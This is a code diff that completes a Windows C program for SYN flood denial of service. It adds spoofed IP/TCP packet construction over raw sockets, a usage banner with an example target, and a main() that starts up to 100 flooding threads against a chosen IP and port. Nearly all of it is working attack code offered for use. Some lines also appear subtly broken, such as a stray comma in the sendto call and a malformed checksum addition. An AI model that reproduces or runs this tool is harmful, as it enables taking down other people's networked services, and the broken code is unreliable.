@@ -52,7 +52,7 @@ USHORT checksum(USHORT *buffer, int size){
     if(size) cksum += (UCHAR*)buffer;
     cksum = (cksum >> 16) + (cksum & 0xffff);
     cksum += (cksum >> 16);
-    return (USHORT) (~cksum);
+    return (USHORT)(~cksum);
 }
 
 DWORD WINAPI SynfloodThread(LPVOID lp){
@@ -105,7 +105,29 @@ DWORD WINAPI SynfloodThread(LPVOID lp){
         tcpheader.th_sport = htons(SendSEQ);
         tcpheader.th_sum = 0;
         PSD_HEADER.saddr = ipheader.sourceIP;
+
+        memcpy(sendBuf, &PSD_HEADER, sizeof(PSD_HEADER));
+        memcpy(sendBuf + sizeof(PSD_HEADER), &tcpheader, sizeof(tcpheader));
+        tcpheader.th_sum = checksum((USHORT *)sendBuf, sizeof(PSD_HEADER) + sizeof(tcpheader));
+        memcpy(sendBuf, &ipheader, sizeof(ipheader));
+        memcpy(sendBuf+sizeof(ipheader), &tcpheader, sizeof(tcpheader));
+        memset(sendBuf+sizeof(ipheader)+sizeof(tcpheader), 0, 4);
+        dataSize = sizeof(ipheader) + sizeof(tcpheader);
+        ipheader.checksum = checksum((USHORT*)sendBuf, dataSize);
+        memcpy(sendBuf, &ipheader, sizeof(ipheader));
+        sendto(sock, sendBuf, dataSize, 0, (struct sockaddr*), &sockAddr, sizeof(sockAddr));
+        display();
     }
+    Sleep(20);
+    InterlockedExchangeAdd((long*)&threadnum, -1);
+    return 0;
+}
+
+void usage(char *name){
+    printf("\t========================= SYN Flood ============================\n");
+    printf("\t****************************************************************\n");
+    printf("\tusage: %s [dest_ip] [port] [thread]\n", name);
+    printf("\texample: %s 192.168.1.1 80 100\n", name);
 }
 
 void display(void){
@@ -119,4 +141,35 @@ void display(void){
     play = (play == 11) ? 0 : play + 1;
 }
 
+int main(int argc, char* argv[]){
+    
+    WSADATA wsaData;
 
+    usage(argv[0]);
+    
+    if(argc != 4)
+        return 0;
+
+    int ErrorCode = 0;
+    DestIP = argv[1];
+    port = atoi(argv[2]);
+    maxthread = (atoi(argv[3]) > 100) ? 100 : atoi(argv[3]);
+
+    if(ErrorCode = WSAStartup(MAKEWORD(2,2), &wsaData) != 0){
+        printf("WSAStartup failed: %d\n", ErrorCode);
+        return 0;
+    }
+
+    printf("[start] ... \nPress any key to stop!\n");
+
+    while(threadnum < maxthread){
+        if(CreateThread(NULL, 0, SynfloodThread, 0, 0, 0)){
+            Sleep(10);
+            threadnum++;
+        }
+    }
+
+    WSACleanup();
+    printf("\n[Stopd] ... \n");
+    return 0;
+}
